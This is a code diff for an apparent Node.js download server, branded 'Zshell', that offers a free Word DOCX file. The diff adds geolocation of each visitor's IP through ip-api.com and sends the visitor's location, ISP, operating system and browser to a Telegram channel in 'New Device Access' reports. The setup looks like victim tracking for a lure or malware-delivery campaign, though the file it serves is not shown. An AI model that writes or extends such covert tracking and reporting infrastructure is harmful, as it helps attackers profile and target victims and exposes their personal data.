@@ -54,12 +54,44 @@ function getClientIP(req) {
            'Unknown';
 }
 
-// Format download log message
-function formatDownloadLog(userAgent, ip, referrer) {
+// Get geolocation data for IP
+async function getLocationData(ip) {
+    try {
+        // Skip geolocation for localhost/private IPs
+        if (ip === '127.0.0.1' || ip === 'localhost' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
+            return { country: 'Local Network', city: 'Localhost', isp: 'Local' };
+        }
+        
+        // Use IP-API.com (free, no API key required, 45 requests/minute)
+        const response = await axios.get(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,region,regionName,city,isp,org,timezone`, {
+            timeout: 3000
+        });
+        
+        if (response.data && response.data.status === 'success') {
+            return {
+                country: response.data.country || 'Unknown',
+                city: response.data.city || 'Unknown',
+                region: response.data.regionName || '',
+                isp: response.data.isp || 'Unknown',
+                timezone: response.data.timezone || 'Unknown'
+            };
+        }
+    } catch (error) {
+        console.log('⚠️ Geolocation lookup failed:', error.message);
+    }
+    
+    return { country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
+}
+
+// Format download log message with real detection
+async function formatDownloadLog(userAgent, ip, referrer) {
     const parser = new UAParser(userAgent);
     const browser = parser.getBrowser();
     const os = parser.getOS();
     const device = parser.getDevice();
+    
+    // Get real geolocation data
+    const location = await getLocationData(ip);
     
     const currentTime = new Date().toLocaleString('en-US', {
         timeZone: 'UTC',
@@ -71,27 +103,43 @@ function formatDownloadLog(userAgent, ip, referrer) {
         second: '2-digit'
     });
 
+    // Format platform with real detection
+    const platformName = os.name || 'Unknown OS';
+    const platformVersion = os.version ? ` ${os.version}` : '';
+    const platform = `${platformName}${platformVersion}`;
+    
+    // Format browser with real detection
+    const browserName = browser.name || 'Unknown Browser';
+    const browserVersion = browser.version ? ` ${browser.version}` : '';
+    const browserInfo = `${browserName}${browserVersion}`;
+    
+    // Format device type
+    const deviceType = device.type || os.name || platformName;
+    
+    // Format location info
+    const locationInfo = location.city !== 'Unknown' ? `${location.city}, ${location.country}` : location.country;
+    const ispInfo = location.isp !== 'Unknown' ? ` (${location.isp})` : '';
+
     return `🧛‍♂️ Zshell
 📢 New Device Access
  DOCX CLIENT
 
-🌍 IP: ${ip}
-🖥 Platform: ${os.name || 'auto detect'} ${os.version || 'windows'}
-🌐 Browser: ${browser.name || 'auto detect'} ${browser.version || 'agent'}
-🌎 Country: Auto-detecting...
+🌍 IP: ${ip}${ispInfo}
+🖥 Platform: ${platform}
+🌐 Browser: ${browserInfo}
+🌎 Country: ${locationInfo}
 
 🔵 Docx User attempting to download Docx file
-📱 Device: ${device.type || os.name || 'windows'}
+📱 Device: ${deviceType}
 🌍 IP: ${ip}
-🌐 Browser: ${browser.name || 'Unknown'} ${browser.version || ''}
-📏 Resolution: Auto-detecting...
-📐 Window: Auto-detecting...
+🌐 Browser: ${browserInfo}
+📍 Location: ${locationInfo}
 ⏰ Time: ${currentTime}
 🔄 Referrer: ${referrer || 'Direct'}
 
-🔽 Docx user attempting to download Docx file for ${device.type || os.name || 'windows'} device
+🔽 Docx user attempting to download Docx file for ${deviceType} device
 
-✅ Docx file download started successfully for ${device.type || os.name || 'windows'} device`;
+✅ Docx file download started successfully for ${deviceType} device`;
 }
 
 // Middleware
@@ -144,8 +192,9 @@ app.get('/api/download/word-free', (req, res) => {
     console.log(`🌐 User Agent: ${userAgent}`);
     
     // Send Telegram log for download attempt (non-blocking)
-    const logMessage = formatDownloadLog(userAgent, clientIP, referrer);
-    sendTelegramLog(logMessage);
+    formatDownloadLog(userAgent, clientIP, referrer)
+        .then(logMessage => sendTelegramLog(logMessage))
+        .catch(error => console.error('❌ Failed to format log message:', error.message));
     
     // Set headers for download
     res.setHeader('Content-Disposition', `attachment; filename="${fileName}"`);
@@ -176,14 +225,26 @@ app.get('/api/download/word-free', (req, res) => {
             console.log(`✅ Download completed successfully: ${fileName}`);
             
             // Send success confirmation to Telegram (non-blocking)
-            const successMessage = `✅ Download Completed Successfully
+            getLocationData(clientIP)
+                .then(location => {
+                    const parser = new UAParser(userAgent);
+                    const os = parser.getOS();
+                    const browser = parser.getBrowser();
+                    const deviceType = os.name || 'Unknown';
+                    const locationInfo = location.city !== 'Unknown' ? `${location.city}, ${location.country}` : location.country;
+                    
+                    const successMessage = `✅ Download Completed Successfully
 🧛‍♂️ Zshell - Success Report
 🌍 IP: ${clientIP}
+📍 Location: ${locationInfo}
 📁 File: ${fileName}
-📱 Device: ${new UAParser(userAgent).getOS().name || 'Unknown'}
+📱 Device: ${deviceType}
+🌐 Browser: ${browser.name || 'Unknown'} ${browser.version || ''}
 ⏰ Time: ${new Date().toLocaleString('en-US', { timeZone: 'UTC' })}`;
-            
-            sendTelegramLog(successMessage);
+                    
+                    sendTelegramLog(successMessage);
+                })
+                .catch(error => console.error('❌ Failed to format success message:', error.message));
         }
     });
 });
